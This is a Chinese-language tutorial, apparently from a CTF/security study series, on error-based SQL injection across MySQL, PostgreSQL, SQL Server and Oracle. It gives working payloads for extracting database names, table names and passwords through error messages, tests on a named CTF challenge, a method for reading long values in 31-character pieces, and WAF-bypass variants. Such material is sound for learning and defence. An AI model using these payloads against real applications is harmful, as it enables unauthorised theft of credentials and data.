    07 · 报错注入（Error-Based Injection）¶

    核心思想:让数据库把查询结果"写进"错误消息里,然后你去错误消息里读数据。

    一次请求能带几十个字符,比布尔盲注快一个数量级。

    一、什么情况下能用¶

    ① 应用会把数据库报错原文显示在页面上   ← 硬前提
② 数据库有"类型转换失败回显原值"的行为
③ 你能控制报错内容里的一部分

    第 ① 条 5 秒就能测:

    ' and extractvalue(1,'~')--
    返回 结论
    XPATH syntax error: '~' ✅ 能用
    正常页面 ❌ 报错被吞,改盲注
    500 但看不到内容 ❌ 同上

    二、原理:错误消息里的两种"回显"¶

    2.1 类型转换失败 → 回显原值¶

    SELECT CAST('abc' AS int)
-- 报错:invalid input syntax for type integer: "abc"

    数据库把"转不过去的那个值"原样打印出来了。

    → 把查询结果放进去,结果就出现在报错里。

    2.2 解析失败 → 回显原值¶

    SELECT EXTRACTVALUE(1, '~hello')
-- 报错:XPATH syntax error: '~hello'

    MySQL 解析 XPath 失败时,把整段非法内容打印出来。

    → 同样,把查询结果拼进去就行。

    2.3 共同点¶

    错误消息 = 一个"字符串输出通道"
你只要把数据拼进那个会被回显的位置

    三、四数据库速查¶

    数据库 核心函数 报错特征 一次能带
    MySQL extractvalue(1,concat(0x7e,数据)) XPATH syntax error: '~...' 31 字符
    MySQL updatexml(1,concat(0x7e,数据),1) 同上 31 字符
    PostgreSQL CAST((select ...) AS int) invalid input syntax for type integer: "..." 较长
    SQL Server CONVERT(int,(select ...)) Conversion failed when converting the varchar value '...' to data type int 较长
    Oracle xmltype(...) + CHR() ORA-31011 / LPX-00225 约 64 字符

    四、MySQL 详解¶

    4.1 extractvalue 的签名¶

    ExtractValue(xml文档, xpath表达式)

    正常情况下从 XML 里按 XPath 取值:

    SELECT ExtractValue('<a><b>1</b></a>', '/a/b');
-- → 1

    4.2 三段式¶

    extractvalue(1, concat(0x7e, (select database())))
             ↑   ↑      ↑
             ①   ②      ③
    位置 内容 作用
    ① 1 占位符。XPath 先报错,XML 根本没被解析,随便填
    ② concat(0x7e, 数据) 拼接
    ③ 0x7e 就是 ~,不是合法 XPath 字符 → 保证报错,并当数据起始标记

    4.3 实测三条(在 [极客大挑战 2019]HardSQL 上)¶

    ① 合法 XML + 合法 XPath → 不报错

    2'or(extractvalue(0x3c613e3c623e313c2f623e3c2f613e,'/a/b'))#

    0x3c61… = <a><b>1</b></a>

    → Login Success!!(返回 1,没有报错)

    ② XPath 里塞 ~ → 报错带内容

    2'or(extractvalue(1,concat(0x7e,'hello')))#

    → Error! XPATH syntax error: '~hello'

    ③ 长度测试:塞 36 个字符,只回 31 个

    2'or(extractvalue(1,concat(0x7e,'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')))#

    → XPATH syntax error: '~ABCDEFGHIJKLMNOPQRSTUVWXYZ01234'

    ~ + 31 个字符 = 32 字符上限

    → 一次最多带 31 个数据字符。

    4.4 分片公式¶

    -- 第 1~31
left(数据,31)

-- 第 32~62
right(left(数据,62),31)

-- 第 63~93
right(left(数据,93),31)

    先查 length() 确定总长,再按 31 一段切。

    4.5 updatexml:同一招,换个函数¶

    updatexml(xml, xpath, new_value)
              ↑
        第 2 个参数放数据

    updatexml(1, concat(0x7e, (select database())), 1)

    → 报错格式和 extractvalue 一模一样,也是 32 字符上限。

    两个函数可以互为备份 —— 一个被 WAF 拦了,换另一个。

    4.6 其他能带数据的 MySQL 报错¶

    -- 5.7+:几何类型解析失败
select geometrycollection((select database()));
select polygon((select database()));
select linestring((select database()));

-- exp 溢出:值超出 DOUBLE 范围
select exp(~(select * from(select database())a));

-- floor + rand 主键冲突(经典)
select count(*),concat((select database()),floor(rand(0)*2))x
from information_schema.tables group by x;

    geometrycollection 能带的字符数比 extractvalue 多,长数据可以优先试它。

    4.7 WAF 下的写法(空格 / = / and 被拦)¶

    -- 标准
' and extractvalue(1,concat(0x7e,(select database())))-- -

-- 无空格 + 无 and
'or(extractvalue(1,concat(0x7e,(select(database())))))#

-- 取表名(用 instr 代替 where ... = ...)
'or(extractvalue(1,concat(0x7e,(select(left(group_concat(table_name),31))from(information_schema.tables)where(instr(table_schema,'geek'))))))#

-- 取数据
'or(extractvalue(1,concat(0x7e,(select(left(group_concat(password),31))from(H4rDsq1)))))#

    关键:( 就是天然的分词符,不需要空格。

    五、PostgreSQL 详解¶

    5.1 核心手法:CAST 到 int¶

    ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

    → ERROR: invalid input syntax for type integer: "s3cr3t"

    5.2 为什么必须是 1=CAST(...)¶

    ' AND CAST(...)          -- ❌ argument of AND must be type boolean, not type integer
' AND 1=CAST(...)        -- ✅ CAST 返回数字,和 1 比较得到布尔

    AND 两边都要是布尔值。

    5.3 子查询必须单行¶

    1=CAST((SELECT password FROM users) AS int)         -- ❌ more than one row
1=CAST((SELECT password FROM users LIMIT 1) AS int) -- ✅ 加 LIMIT

    5.4 备选函数¶

    -- 除零(不能带数据,只能做条件判断)
' AND 1=(SELECT 1/0)--

-- 转为数值型
' AND 1=CAST((SELECT ...) AS numeric)--

    六、SQL Server 详解¶

    6.1 核心手法:CONVERT / CAST¶

    ' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--

    → Conversion failed when converting the varchar value 's3cr3t' to data type int.

    6.2 变体¶

    ' AND 1=CONVERT(int,@@version)--
' AND 1=CAST((SELECT TOP 1 name FROM sysobjects) AS int)--

    TOP 1 用来限制返回行数(等价于 MySQL 的 LIMIT 1)。

    七、Oracle 详解¶

    7.1 XMLType 解析失败¶

    ' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(58)||
        (SELECT password FROM users WHERE rownum=1)||CHR(62))) FROM dual)--

    CHR(60) = <,CHR(58) = :,CHR(62) = >

    构造出 <::密码> 这种非法 XML → ORA-31011: XML parsing failed + LPX-00225 里带数据。

    7.2 CTXSYS.DRITHSX.SN¶

    ' AND 1=(SELECT CTXSYS.DRITHSX.SN(1,(SELECT password FROM users WHERE rownum=1)) FROM dual)--

    需要该包存在(默认有的环境)。

    7.3 UTL_INADDR¶

    ' AND 1=(SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)) FROM dual)--

    报错 ORA-29257: host ... unknown —— 数据在主机名位置。

    ⚠️ 这个需要权限,或者本身就会变成 OOB。

    八、判断与选择:报错注入怎么排优先级¶

    ① 先测报错是否回显         → 5 秒
② 报错能回显 → 直接报错注入(最快)
③ 报错不回显 → 看有没有状态码差异 → 条件错误盲注
④ 没有状态码差异 → 看页面内容差异 → 条件响应盲注
⑤ 都没有 → 时间盲注
⑥ 时间也不能用 → OOB

    报错注入永远排在"盲注"前面 —— 因为一次能带几十个字符。

    九、常见坑¶

    坑 现象 解决
    报错被吞 页面正常,什么都看不到 改盲注
    只返回 32 字符 数据被截断 left/right 分片
    子查询多行报错 Subquery returns more than 1 row limit 1 / group_concat
    AND 类型不对 PG 报 boolean 错 写 1=CAST(...)
    函数名被 WAF 拦 直接 403/拦截页 换 updatexml / geometrycollection
    空格被拦 拦截页 用 ( ) 分词
    = 被拦 拦截页 用 like / instr()
    concat 被拦 拦截页 make_set(1,数据) / export_set
    0x7e 被拦 拦截页 char(126) 或 unhex('7e')

    十、一句话总结¶

    报错注入 = 把数据拼进"会被错误消息回显"的位置。

    MySQL 用 extractvalue(1,concat(0x7e,数据)),PostgreSQL 用 CAST(... AS int)。

    一次 31 个字符(MySQL),长的用 left/right 切。

    前提只有一个:应用肯把报错给你看。
